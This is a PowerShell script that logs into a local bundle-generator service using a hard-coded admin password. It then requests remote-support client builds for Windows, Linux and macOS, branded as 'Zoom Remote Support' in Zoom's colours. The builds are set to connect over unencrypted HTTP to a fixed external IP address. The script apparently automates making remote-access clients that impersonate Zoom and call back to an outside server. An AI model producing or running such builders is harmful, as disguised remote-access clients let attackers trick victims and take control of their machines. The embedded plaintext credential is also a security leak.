param(
    [string]$User = 'admin',
    [string]$Pass = 'tKjsnYB8Mez2FRd1',
    [string]$Base = 'http://localhost:5000',
    [string]$ServerHost = '109.204.74.122',
    [string]$Name = 'Zoom Support Client',
    [string]$Slug = 'zoom'
)
$ErrorActionPreference = 'Stop'
$sess = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$page = Invoke-WebRequest -Uri "$Base/login" -WebSession $sess -UseBasicParsing -TimeoutSec 20
$csrf = ''
if ($page.Content -match "csrfToken:\s*'([^']+)'") { $csrf = $Matches[1] }
if (-not $csrf -and ($page.Content -match 'name="_csrf"[^>]*value="([^"]+)"')) { $csrf = $Matches[1] }
$h = @{ 'X-CSRF-Token' = $csrf; 'Content-Type' = 'application/json' }
$null = Invoke-WebRequest -Uri "$Base/api/auth/login" -Method Post -Body (@{username=$User;password=$Pass}|ConvertTo-Json -Compress) -Headers $h -WebSession $sess -UseBasicParsing -TimeoutSec 25
Write-Output "LOGIN ok"

# 1. Accept AGPL / incoming-only terms (required before build)
try {
    $t = Invoke-WebRequest -Uri "$Base/api/generator/module/accept-terms" -Method Post -Body '{}' -Headers $h -WebSession $sess -UseBasicParsing -TimeoutSec 20
    Write-Output ("accept-terms: " + $t.StatusCode)
} catch { Write-Output ("accept-terms ERR: " + $_.Exception.Message); if($_.ErrorDetails){Write-Output $_.ErrorDetails.Message} }

# 2. Create the bundle with Zoom branding + all 6 platforms
$branding = @{
    company_name    = 'Zoom'
    app_name        = 'Zoom'
    product_label   = 'Zoom Remote Support'
    server_host     = $ServerHost
    relay_host      = $ServerHost
    use_https       = $false
    primary_color   = '#2d8cff'
    accent_color    = '#0b5cff'
    background_color= '#ffffff'
    surface_color   = '#f3f4f6'
    text_color      = '#1f2937'
}
$platforms = @(
    @{platform='windows';arch='x64';format='portable'},
    @{platform='windows';arch='arm64';format='portable'},
    @{platform='linux';arch='x64';format='portable'},
    @{platform='linux';arch='arm64';format='portable'},
    @{platform='macos';arch='x64';format='portable'},
    @{platform='macos';arch='arm64';format='portable'}
)
$payload = @{ name = $Name; slug = $Slug; branding = $branding; platforms = $platforms } | ConvertTo-Json -Depth 8 -Compress
try {
    $c = Invoke-WebRequest -Uri "$Base/api/generator/bundles" -Method Post -Body $payload -Headers $h -WebSession $sess -UseBasicParsing -TimeoutSec 60
    Write-Output ("create bundle: " + $c.StatusCode)
    Write-Output $c.Content
} catch {
    Write-Output ("create ERR: " + $_.Exception.Message)
    if ($_.ErrorDetails) { Write-Output $_.ErrorDetails.Message }
}
